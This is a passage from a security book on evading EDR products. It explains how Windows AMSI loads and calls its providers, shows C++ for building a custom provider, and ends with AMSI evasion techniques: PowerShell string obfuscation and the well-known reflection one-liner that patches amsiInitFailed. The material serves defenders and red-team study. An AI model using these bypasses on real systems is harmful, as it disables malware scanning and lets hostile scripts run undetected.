00007ff9`5ea75590 48ff1589790000 call  qword ptr [amsi!_imp_RegGetValueW]
0:011> du @rdx
00000057`2067eaa0 "Software\Classes\CLSID\{2781761E"
00000057`2067eae0 "-28E0-4109-99FE-B9D127C57AFE}\In"
00000057`2067eb20 "procServer32"
Listing 10-10: The parameters passed to RegGetValueW
Next, amsi!CheckTrustLevel() is called to check the value of the registry 
key SOFTWARE\Microsoft\AMSI\FeatureBits. This key contains a DWORD, 
which can be either 1 (the default) or 2 to disable or enable Authenticode 
signing checks for providers. If Authenticode signing checks are enabled, 
the path listed in the InProcServer32 registry key is verified. Following a suc-
cessful check, the path is passed into LoadLibraryW() to load the AMSI pro-
vider DLL, as demonstrated in Listing 10-11.
0:011> u @rip L1
amsi!AmsiComSecureLoadInProcServer+0x297:
00007ff9`5ea7569b 48ff15fe770000 call  qword ptr [amsi!_imp_LoadLibraryExW]
Evading EDR (Early Access) © 2023 by Matt Hand
Antimalware Scan Interface   191
0:011> du @rcx
00000057`2067e892 "C:\ProgramData\Microsoft\Windows"
00000057`2067e8d2 " Defender\Platform\4.18.2111.5-0"
00000057`2067e912 "\MpOav.dll"
Listing 10-11: The MpOav.dll loaded via LoadLibraryW()
If the provider DLL loads successfully, its DllRegisterServer() function 
is called to tell it to create registry entries for all COM classes supported 
by the provider. This cycle repeats calls to amsi!CGuidEnum::NextGuid() until 
all providers are loaded. Listing 10-12 shows the final step: invoking the 
QueryInterface() method for each provider in order to get a pointer to the 
IAntimalware interfaces.
0:011> dt OLE32!IID @rdx
 {82d29c2e-f062-44e6-b5c9-3d9a2f24a2df}
 +0x000 Data1  
: 0x82d29c2e
 +0x004 Data2  
: 0xf062
 +0x006 Data3  
: 0x44e6
 +0x008 Data4  
: [8] "???"
0:011> u @rip L1
amsi!ATL::CComCreator >::CreateInstance+0x10d:
00007ff8`0b7475bd ff15b55b0000 call qword ptr [amsi!_guard_dispatch_icall_fptr]
0:011> t
amsi!ATL::CComObject::QueryInterface:
00007ff8`0b747a20 4d8bc8    mov     r9,r8
Listing 10-12: Calling QueryInterface on the registered provider
After AmsiInitialize() returns, AMSI is ready to go. Before PowerShell 
begins evaluating a script block, it calls AmsiOpenSession(). As mentioned 
previously, this function allows AMSI to correlate multiple scans. When this 
function completes, it returns a HAMSISESSION to the caller, and the caller can 
choose to pass this value to all subsequent calls to AMSI within the current 
scanning session.
When PowerShell’s AMSI instrumentation receives a script block and 
an AMSI session has been opened, it calls AmsiScanBuffer() with the script 
block passed as input. This function is defined in Listing 10-13.
HRESULT AmsiScanBuffer(
 [in] 
HAMSICONTEXT amsiContext,
 [in] 
PVOID 
 buffer,
 [in] 
ULONG 
 length,
 [in] 
LPCWSTR 
 contentName,
 [in, optional] HAMSISESSION amsiSession,
 [out]  
AMSI_RESULT *result
);
Listing 10-13: The AmsiScanBuffer() definition
The function’s primary responsibility is to check the validity of the 
parameters passed to it. This includes checks for content in the input buffer 
Evading EDR (Early Access) © 2023 by Matt Hand
192   Chapter 10
and the presence of a valid HAMSICONTEXT handle with a tag of AMSI, as you can 
see in the decompilation in Listing 10-14. If any of these checks fail, the 
function returns E_INVALIDARG (0x80070057) to the caller.
if ( !buffer )
 return 0x80070057;
if ( !length )
 return 0x80070057;
if ( !result )
 return 0x80070057;
if ( !amsiContext )
 return 0x80070057;
if ( *amsiContext != ‘ISMA’ )
 return 0x80070057;
if ( !*(amsiContext + 1) )
 return 0x80070057;
v10 = *(amsiContext + 2);
if ( !v10 )
 return 0x80070057;
Listing 10-14: Internal AmsiScanBuffer() sanity checks
If these checks pass, AMSI invokes amsi!CAmsiAntimalware::Scan(), as 
shown in the call stack in Listing 10-15.
0:023> kc
 # Call Site
00 amsi!CAmsiAntimalware::Scan
01 amsi!AmsiScanBuffer
02 System_Management_Automation_ni
Listing 10-15: The Scan() method called
This method contains a while loop that iterates over every registered 
AMSI provider (the count of which is stored at R14 + 0x1c0). In this loop, it 
calls the IAntimalwareProvider::Scan() function, which the EDR vendor can 
implement however they wish; it is only expected to return an AMSI_RESULT, 
defined in Listing 10-16.
HRESULT Scan(
 [in]   IAmsiStream *stream,
 [out]  AMSI_RESULT *result
);
Listing 10-16: The CAmsiAntimalware::Scan() function definition
In the case of the default Microsoft Defender AMSI implementation, 
MpOav.dll, this function performs some basic initialization and then hands 
execution over to MpClient.dll, the Windows Defender client interface. Note 
that Microsoft doesn’t supply program database files for Defender com-
ponents, so MpOav.dll’s function name in the call stack in Listing 10-17 is 
incorrect.
Evading EDR (Early Access) © 2023 by Matt Hand
Antimalware Scan Interface   193
0:000> kc
 # Call Site
00 MPCLIENT!MpAmsiScan
01 MpOav!DllRegisterServer
02 amsi!CAmsiAntimalware::Scan
03 amsi!AmsiScanBuffer
Listing 10-17: Execution passed to MpClient.dll from MpOav.dll
AMSI passes the result of the scan back to amsi!AmsiScanBuffer() via 
amsi!CAmsiAntimalware::Scan(), which in turn returns the AMSI_RESULT to 
the caller. If the script block was found to contain malicious content, 
PowerShell throws a ScriptContainedMaliciousContent exception and prevents 
its execution.
Implementing a Custom AMSI Provider
As mentioned in the previous section, developers can implement the 
IAntimalwareProvider::Scan() function however they like. For example, they 
could simply log information about the content to be scanned, or they 
could pass the contents of a buffer through a trained machine-learning 
model to evaluate its maliciousness. To understand the shared architec-
ture of all vendors’ AMSI providers, this section steps through the design 
of a simple provider DLL that meets the minimum specifications defined 
by Microsoft.
At their core, AMSI providers are nothing more than COM servers, or 
DLLs loaded into a host process that expose a function required by the 
caller: in this case, IAntimalwareProvider. This function extends the IUnknown 
interface by adding three additional methods: CloseSession closes the AMSI 
session via its HAMSISESSION handle, DisplayName displays the name of the 
AMSI provider, and Scan scans an IAmsiStream of content and returns an 
AMSI_RESULT.
In C++, a basic class declaration that overrides IAntimalwareProvider’s 
methods may look something like the code shown in Listing 10-18.
class AmsiProvider :
public RuntimeClass,
IAntimalwareProvider,
FtmBase>
{
public:
IFACEMETHOD(Scan)(
IAmsiStream *stream,
AMSI_RESULT *result
) override;
IFACEMETHOD_(void, CloseSession)(
ULONGLONG session
) override;
Evading EDR (Early Access) © 2023 by Matt Hand
194   Chapter 10
IFACEMETHOD(DisplayName)(
LPWSTR *displayName
) override;
};
Listing 10-18: An example IAntimalwareProvider class definition
Our code makes use of the Windows Runtime C++ Template Library, 
which reduces the amount of code used to create COM components. The 
CloseSession() and DisplayName() methods are simply overridden with our 
own functions to close the AMSI session and return the name of the AMSI 
provider, respectively. The Scan() function receives the buffer to be scanned 
as part of an IAmsiStream, which exposes two methods, GetAttribute() and 
Read(), and is defined in Listing 10-19.
MIDL_INTERFACE("3e47f2e5-81d4-4d3b-897f-545096770373")
IAmsiStream : public IUnknown
{
public:
virtual HRESULT STDMETHODCALLTYPE GetAttribute(
/* [in] */ AMSI_ATTRIBUTE attribute,
/* [range][in] */ ULONG dataSize,
/* [length_is][size_is][out] */ unsigned char *data,
/* [out] */ ULONG *retData) = 0;
virtual HRESULT STDMETHODCALLTYPE Read(
/* [in] */ ULONGLONG position,
/* [range][in] */ ULONG size,
/* [length_is][size_is][out] */ unsigned char *buffer,
/* [out] */ ULONG *readSize) = 0;
};
Listing 10-19: The IAmsiStream class definition
The GetAttribute() retrieves metadata about the contents to be scanned. 
Developers request these attributes by passing an AMSI_ATTRIBUTE value that 
indicates what information they would like to retrieve, along with an appro-
priately sized buffer. The AMSI_ATTRIBUTE value is an enumeration defined in 
Listing 10-20.
typedef enum AMSI_ATTRIBUTE {
AMSI_ATTRIBUTE_APP_NAME = 0,
AMSI_ATTRIBUTE_CONTENT_NAME = 1,
AMSI_ATTRIBUTE_CONTENT_SIZE = 2,
AMSI_ATTRIBUTE_CONTENT_ADDRESS = 3,
AMSI_ATTRIBUTE_SESSION = 4,
AMSI_ATTRIBUTE_REDIRECT_CHAIN_SIZE = 5,
AMSI_ATTRIBUTE_REDIRECT_CHAIN_ADDRESS = 6,
AMSI_ATTRIBUTE_ALL_SIZE = 7,
AMSI_ATTRIBUTE_ALL_ADDRESS = 8,
AMSI_ATTRIBUTE_QUIET = 9
} AMSI_ATTRIBUTE;
Listing 10-20: The AMSI_ATTRIBUTE enumeration
Evading EDR (Early Access) © 2023 by Matt Hand
Antimalware Scan Interface   195
While there are 10 attributes in the enumeration, Microsoft docu-
ments only the first five: AMSI_ATTRIBUTE_APP_NAME is a string containing the 
name, version, or GUID of the calling application; AMSI_ATTRIBUTE_CONTENT 
_NAME is a string containing the filename, URL, script ID, or equivalent 
identifier of the content to be scanned; AMSI_ATTRIBUTE_CONTENT_SIZE is a 
ULONGLONG containing the size of the data to be scanned; AMSI_ATTRIBUTE_
CONTENT_ADDRESS is the memory address of the content, if it has been fully 
loaded into memory; and AMSI_ATTRIBUTE_SESSION contains a pointer to 
the next portion of the content to be scanned or NULL if the content is 
self-contained.
As an example, Listing 10-21 shows how an AMSI provider might use 
this attribute to retrieve the application name.
HRESULT AmsiProvider::Scan(IAmsiStream* stream, AMSI_RESULT* result)
{
HRESULT hr = E_FAIL;
ULONG ulBufferSize = 0;
ULONG ulAttributeSize = 0;
PBYTE pszAppName = nullptr;
hr = stream->GetAttribute(
AMSI_ATTRIBUTE_APP_NAME,
0,
nullptr,
&ulBufferSize
);
if (hr != E_NOT_SUFFICIENT_BUFFER)
{
return hr;
}
pszAppName = (PBYTE)HeapAlloc(
GetProcessHeap(),
0,
ulBufferSize
);
if (!pszAppName)
{
return E_OUTOFMEMORY;
}
hr = stream->GetAttribute(
AMSI_ATTRIBUTE_APP_NAME,
ulBufferSize,
1 pszAppName,
&ulAttributeSize
);
if (hr != ERROR_SUCCESS || ulAttributeSize > ulBufferSize)
{
HeapFree(
Evading EDR (Early Access) © 2023 by Matt Hand
196   Chapter 10
GetProcessHeap(),
0,
pszAppName
);
return hr;
}
--snip--
}
Listing 10-21: An implementation of the AMSI scanning function
When PowerShell calls this example function, pszAppName 1 will contain 
the application name as a string, which AMSI can use to enrich the scan 
data. This becomes particularly useful if the script block is deemed mali-
cious, as the EDR could use the application name to terminate the calling 
process.
If AMSI_ATTRIBUTE_CONTENT_ADDRESS returns a memory address, we know 
that the content to be scanned has been fully loaded into memory, so we 
can interact with it directly. Most often, the data is provided as a stream, in 
which case we use the Read() method (defined in Listing 10-22) to retrieve 
the contents of the buffer one chunk at a time. We can define the size of 
these chunks, which get passed, along with a buffer of the same size, to the 
Read() method.
HRESULT Read(
 [in] ULONGLONG 
position,
 [in] ULONG  
size,
 [out] unsigned char *buffer,
 [out] ULONG  
*readSize
);
Listing 10-22: The IAmsiStream::Read() method definition
What the provider does with these chunks of data is completely up to the 
developer. They could scan each chunk, read the full stream, and hash its 
contents, or simply log details about it. The only rule is that, when the Scan() 
method returns, it must pass an HRESULT and an AMSI_RESULT to the caller.
Evading AMSI
AMSI is one of the most-studied areas when it comes to evasion. This 
is due in no small part to how effective it was in its early days, causing 
significant headaches for offensive teams that used PowerShell heavily. 
For them, AMSI presented an existential crisis that prevented their main 
agents from functioning.
Attackers can employ a variety of evasion techniques to bypass AMSI. 
While certain vendors have attempted to flag some of these as malicious, 
the number of evasion opportunities present in AMSI is staggering, so 
Evading EDR (Early Access) © 2023 by Matt Hand
Antimalware Scan Interface   197
vendors usually can’t handle all of them. This section covers some of the 
more popular evasions in today’s operating environment, but bear in mind 
that there are many variations to each of these techniques.
String Obfuscation
One of the earliest evasions for AMSI involved simple string obfuscation. If 
an attacker could determine which part of a script block was being flagged 
as malicious, they could often get around the detection by splitting, encod-
ing, or otherwise obscuring the string, as in the example in Listing 10-23.
PS > AmsiScanBuffer
At line:1 char:1
+ AmsiScanBuffer
+ ~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
 + CategoryInfo : ParserError: (:) [], ParentContainsErrorRecordException
 + FullyQualifiedErrorId : ScriptContainedMaliciousContent
PS > "Ams" + "iS" + "can" + "Buff" + "er"
AmsiScanBuffer
PS > $b = [System.Convert]::FromBase64String("QW1zaVNjYW5CdWZmZXI=")
PS > [System.Text.Encoding]::UTF8.GetString($b)
AmsiScanBuffer
Listing 10-23: An example of string obfuscation in PowerShell that evades AMSI
AMSI typically flags the string AmsiScanBuffer, a common component 
of patching-based evasions, as malicious, but here you can see that string 
concatenation allows us to bypass detection. AMSI implementations often 
receive obfuscated code, which they pass off to providers to determine if 
it is malicious. This means the provider must handle language-emulation 
functions such as string concatenation, decoding, and decrypting. However, 
many providers, including Microsoft, fail to detect even trivial bypasses 
such as the one shown here.
AMSI Patching
Because AMSI and its associated providers get mapped into the attacker’s 
process, the attacker has control over this memory. By patching critical val-
ues or functions inside amsi.dll, they can prevent AMSI from functioning 
inside their process. This evasion technique is extremely potent and has 
been the go-to choice for many red teams since around 2016, when Matt 
Graeber discussed using reflection inside PowerShell to patch amsiInitFailed 
to true. His code, included in Listing 10-24, fit into a single tweet.
PS > [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
>> GetField('amsiInitFailed','NonPublic,Static'.SetValue($null,$true)